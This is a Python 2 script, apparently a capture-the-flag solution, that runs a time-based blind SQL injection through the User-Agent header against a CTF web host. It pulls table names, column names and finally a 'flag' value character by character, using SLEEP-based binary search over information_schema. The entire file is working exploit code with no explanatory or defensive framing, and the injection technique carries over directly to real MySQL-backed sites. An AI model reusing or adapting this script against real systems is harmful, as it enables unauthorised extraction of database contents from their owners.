from requests import get
from sys import stdout
import time
__URL__ = "http://ctf.asgama.web.id:45001/"


def findTableName(upper, lower,current):

    # check if null
    inject = "SELECT IF(ASCII(SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),{},1)) = '',sleep(1),1)".format(current)
    query = "'+({})+'".format(inject)

    headers = {'User-Agent': query}
    now = time.time()
    get(__URL__,headers=headers)
    last = time.time()

    if last-now > 1:
        return ''


    char = (upper+lower) / 2

    inject = "SELECT IF(ASCII(SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),{},1)) = {},sleep(1),1)".format(current,char)
    query = "'+({})+'".format(inject)

    # check if equal
    headers = {'User-Agent': query}
    now = time.time()
    get(__URL__,headers=headers)
    last = time.time()

    if last-now > 1:
        return chr(char)


    # greater than char
    inject = "SELECT IF(ASCII(SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),{},1)) > {},sleep(1),1)".format(current,char)
    query = "'+({})+'".format(inject)
    headers = {'User-Agent': query}
    now = time.time()
    get(__URL__,headers=headers)
    last = time.time()

    if last-now > 1:
        return findTableName(upper,char,current)

    else:
        return findTableName(char,lower,current)

def findColumnName(upper, lower,current,tableName):

    # check if null
    inject = "SELECT IF(ASCII(SUBSTRING((SELECT group_concat(column_name) FROM information_schema.columns AS t WHERE table_name='{}'),{},1)) = '',sleep(1),1)".format(tableName,current)
    query = "'+({})+'".format(inject)

    headers = {'User-Agent': query}
    now = time.time()
    get(__URL__,headers=headers)
    last = time.time()

    if last-now > 1:
        return ''


    char = (upper+lower) / 2

    inject = "SELECT IF(ASCII(SUBSTRING((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{}'),{},1)) = {},sleep(1),1)".format(tableName,current,char)
    query = "'+({})+'".format(inject)

    # check if equal
    headers = {'User-Agent': query}
    now = time.time()
    get(__URL__,headers=headers)
    last = time.time()

    if last-now > 1:
        return chr(char)


    # greater than char
    inject = "SELECT IF(ASCII(SUBSTRING((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{}'),{},1)) > {},sleep(1),1)".format(tableName,current,char)
    query = "'+({})+'".format(inject)
    headers = {'User-Agent': query}
    now = time.time()
    get(__URL__,headers=headers)
    last = time.time()

    if last-now > 1:
        return findColumnName(upper,char,current,tableName)

    else:
        return findColumnName(char,lower,current,tableName)

def findContent(upper, lower,current,tableName,columnName):

    # check if null
    inject = "SELECT IF(ASCII(SUBSTRING((SELECT group_concat({}) FROM (SELECT * FROM {}) AS t),{},1)) = '',sleep(1),1)".format(columnName,tableName,current)
    query = "'+({})+'".format(inject)

    headers = {'User-Agent': query}
    now = time.time()
    get(__URL__,headers=headers)
    last = time.time()

    if last-now > 1:
        return ''


    char = (upper+lower) / 2

    inject = "SELECT IF(ASCII(SUBSTRING((SELECT group_concat({}) FROM (SELECT * FROM {}) AS t),{},1)) = {},sleep(1),1)".format(columnName,tableName,current,char)
    query = "'+({})+'".format(inject)

    # check if equal
    headers = {'User-Agent': query}
    now = time.time()
    get(__URL__,headers=headers)
    last = time.time()

    if last-now > 1:
        return chr(char)


    # greater than char
    inject = "SELECT IF(ASCII(SUBSTRING((SELECT group_concat({}) FROM (SELECT * FROM {}) AS t),{},1)) > {},sleep(1),1)".format(columnName,tableName,current,char)
    query = "'+({})+'".format(inject)
    headers = {'User-Agent': query}
    now = time.time()
    get(__URL__,headers=headers)
    last = time.time()

    if last-now > 1:
        return findContent(upper,char,current,tableName,columnName)

    else:
        return findContent(char,lower,current,tableName,columnName)



def main():
    # find table name
    index = 1
    tableName = ""
    print "Finding table name"
    while(True):
        stdout.flush()
        stdout.write("\r{}".format(tableName))
        a = findTableName(0x7f,0x20,index)
        if a != '':
            tableName += a
            index+=1
        else: 
            break
    print
    print "Found Table Name : "+tableName

    print

    tableName = raw_input("Masukkan nama tabel : ")

    # find column_name
    index = 1
    columnName = ""
    print "Finding column name in {}".format(tableName)
    while(True):
        stdout.flush()
        stdout.write("\r{}".format(columnName))
        a = findColumnName(0x7f,0x20,index,tableName)
        if a != '':
            columnName += a
            index+=1
        else: 
            break
    print
    print "Found Column Name : "+columnName

    print
    columnName = raw_input("Masukkan nama column : ")

    # retrieve result
    tableName="bendera";columnName="flag"
    index = 1
    content = ""
    while(True):
        stdout.flush()
        stdout.write("\r{}".format(content))
        a = findContent(0x7f,0x20,index,tableName,columnName)
        if a != '':
            content += a
            index+=1
        else: 
            break
    print
    print "Found : "+content

if __name__ == "__main__":
    main()